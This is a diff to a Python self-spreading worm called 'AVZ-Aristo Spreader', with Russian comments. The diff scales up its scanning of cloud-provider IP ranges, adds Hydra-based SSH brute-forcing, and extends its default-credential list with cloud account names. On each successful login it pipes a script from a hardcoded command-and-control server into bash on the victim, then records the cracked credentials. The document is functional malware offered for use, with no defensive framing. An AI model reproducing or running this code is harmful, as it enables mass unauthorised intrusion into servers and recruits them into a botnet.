@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v26.10 – облачные диапазоны, стабильный SSH
-import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests, traceback, shutil
+# AVZ-Aristo Spreader v27.0 – Hydra, ASN, облачные креды
+import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests, traceback, shutil, tempfile
 from datetime import datetime, timezone, timedelta
 
 if sys.platform != 'win32':
@@ -16,7 +16,7 @@ C2_HOST = "80.249.146.202"
 C2_PORT = 80
 API_PORT = 8080
 AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
-MAX_CONCURRENT = 1500
+MAX_CONCURRENT = 2000
 QUICK_TIMEOUT = 3.0
 BRUTE_TIMEOUT = 8.0
 DEFAULT_SCAN_COUNT = 25_000
@@ -36,7 +36,12 @@ CREDS = [
     ("Administrator",""), ("Administrator","admin"), ("Administrator","password"), ("Administrator","123456"),
     ("cisco","cisco"), ("www-data","www-data"), ("alpine","alpine"),
     ("hadoop","hadoop"), ("elasticsearch","elasticsearch"),
-    ("ftp","ftp"), ("anonymous","anonymous")
+    ("ftp","ftp"), ("anonymous","anonymous"),
+    # Облачные комбинации
+    ("ubuntu","ubuntu"), ("debian","debian"), ("centos","centos"),
+    ("ec2-user","ec2-user"), ("ec2-user","password"), ("ec2-user","123456"),
+    ("azureuser","azureuser"), ("azureuser","password"),
+    ("gcp-user","gcp-user"), ("gcp-user","password")
 ]
 
 SUCCESS_CREDS_FILE = "success_creds.json"
@@ -60,7 +65,8 @@ def cache_port(ip, port):
     c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
     conn.commit()
 
-# Облачные диапазоны (Hetzner, DigitalOcean, OVH, AWS Lightsail)
+# ASN облачных провайдеров (Hetzner, DigitalOcean, OVH, AWS, Azure, GCP)
+CLOUD_ASN = ["AS24940", "AS14061", "AS16276", "AS16509", "AS14618", "AS20473", "AS8075", "AS6584"]
 CLOUD_RANGES = [
     "5.9.0.0/16", "138.201.0.0/16", "116.203.0.0/16", "78.46.0.0/15",
     "167.172.0.0/16", "164.90.0.0/16", "188.166.0.0/16",
@@ -80,13 +86,24 @@ TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()
 def now_str():
     return datetime.now(timezone(timedelta(hours=5))).strftime("%Y-%m-%d %H:%M:%S")
 
+def is_cloud_ip(ip):
+    """Проверяет, принадлежит ли IP облачному провайдеру (через ASN)"""
+    try:
+        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=as", timeout=2)
+        if resp.status_code == 200:
+            asn = resp.json().get("as", "").split()[0]
+            return asn in CLOUD_ASN
+    except:
+        pass
+    return True  # Если не удалось проверить, считаем облачным (чтобы не пропускать)
+
 def random_ip():
-    # 60% облачные провайдеры, 25% гарантированные, 15% случайные
+    # 60% облачные диапазоны, 30% гарантированные, 10% случайные
     if random.random() < 0.6:
         r = random.choice(CLOUD_RANGES)
         net = ipaddress.IPv4Network(r)
         return str(net[random.randint(0, min(255, net.num_addresses-1))])
-    if random.random() < 0.625:
+    if random.random() < 0.75:
         return random.choice(GUARANTEED_IPS)
     while True:
         a = random.randint(1, 223)
@@ -118,9 +135,43 @@ async def probe_port(ip, port):
     except:
         return False
 
-async def ssh_brute(ip):
+async def ssh_brute_hydra(ip):
+    """Использует Hydra для быстрого брутфорса"""
+    if not shutil.which("hydra"):
+        return await ssh_brute_sshpass(ip)
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as uf:
+        uf.write('\n'.join(set(u for u, _ in CREDS + SUCCESS_CREDS)))
+        users_file = uf.name
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as pf:
+        pf.write('\n'.join(set(p for _, p in CREDS + SUCCESS_CREDS if p)))
+        pass_file = pf.name
+    try:
+        cmd = f"hydra -L {users_file} -P {pass_file} -t 16 -f -o /tmp/hydra_{ip}.txt ssh://{ip}"
+        proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
+        await asyncio.wait_for(proc.communicate(), timeout=BRUTE_TIMEOUT * 2)
+        if os.path.exists(f"/tmp/hydra_{ip}.txt"):
+            with open(f"/tmp/hydra_{ip}.txt") as f:
+                for line in f:
+                    if "login:" in line and "password:" in line:
+                        parts = line.split()
+                        u = parts[4] if len(parts) > 4 else ""
+                        p = parts[6] if len(parts) > 6 else ""
+                        if u and p:
+                            cmd2 = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
+                            proc2 = await asyncio.create_subprocess_shell(cmd2)
+                            await asyncio.wait_for(proc2.communicate(), timeout=5)
+                            if proc2.returncode == 0:
+                                save_success_creds(u, p)
+                                return True
+    except Exception as e:
+        print(f"[{now_str()}] [ERROR] Hydra {ip}: {e}", flush=True)
+    finally:
+        os.unlink(users_file)
+        os.unlink(pass_file)
+    return False
+
+async def ssh_brute_sshpass(ip):
     if not shutil.which("sshpass"):
-        print(f"[{now_str()}] [ERROR] sshpass не установлен", flush=True)
         return False
     for u, p in (SUCCESS_CREDS + CREDS):
         cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o ServerAliveInterval=3 {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
@@ -132,8 +183,6 @@ async def ssh_brute(ip):
                 return True
         except asyncio.TimeoutError:
             pass
-        except Exception as e:
-            print(f"[{now_str()}] [ERROR] SSH {ip}:{u}:{p} – {e}", flush=True)
     return False
 
 def save_success_creds(username, password):
@@ -149,7 +198,7 @@ async def infect(ip, port_stats):
     for i, p in enumerate(ports):
         if open_ports[i]:
             port_stats[p] = port_stats.get(p, 0) + 1
-    if open_ports[1] and await ssh_brute(ip):
+    if open_ports[1] and await ssh_brute_hydra(ip):
         print(f"[{now_str()}] [INFECTED] {ip} via SSH", flush=True)
         return True
     return False
